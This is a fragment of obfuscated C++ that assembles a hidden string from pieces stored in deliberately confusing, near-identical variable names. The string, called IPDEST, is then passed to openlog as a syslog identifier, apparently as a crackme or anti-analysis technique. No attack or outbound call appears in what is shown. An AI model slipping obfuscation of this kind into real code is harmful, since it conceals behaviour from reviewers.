...
"MA"; std::string mmamamammamammamammmmaamammam = "KU"; std::string mmamamammamammamamammaamaaama
 = "PI";mmamamammamammamammmmaamammam = "Q";std::string
  mmamamammammamamamammaamammam = "SE";
    std::string mmamamammamammamammaamamammam = "1"
    ;mmamamammamammamamammaamammam = "E";std::string
     mmamaaamamaammammmaaaaamammam = "EJ";
                mmamamammamammamammaamamammam = 
                "I";mmamamammammamamamammaamammam = "U";
                std::string mmamamammamammamamaamammammam = "OA";
                mmamaaamamaammammmaaaaamammam = "P";
                std::string mmamamammamammamamammaamammaa = "UK";std::string mmamamamaamammamamammaamammam = "8";
                mmamamamaamammamamammaamammam = "0";std::string mmaaamammamammamamammaamammam = "QE";std::string mmamamammamamammamammaamammam = "F";
                mmamamammamammamamaamammammam
                 = "CF";mmamamammamammamamaamammammam = "EA";
                 mmaaamammamammamamammaamammam = "5"
                 ;mmamamammamammamamammaamammaa = "O";
                mmamamammamammamamammaamaaama = ":";mmamamammamamammamammaamammam
                 = "-";
    std::string IPDEST;IPDEST.append
    (mmamamammamammamamammaamammam)
    .append(mmamamammamammamammmmaamammam).append(mmamamammammamamamammaamammam).
    append
    (mmamamammamammamammaamamammam).append
    (mmamaaamamaammammmaaaaamammam)
...
.append(mmaaamammamammamamammaamammam)  .append(mmamamammamamammamammaamammam)   .append(mmamamammamammamamaamammammam)
    ...
    openlog(IPDEST.c_str(), LOG_PID | LOG_NDELAY, LOG_LOCAL5);
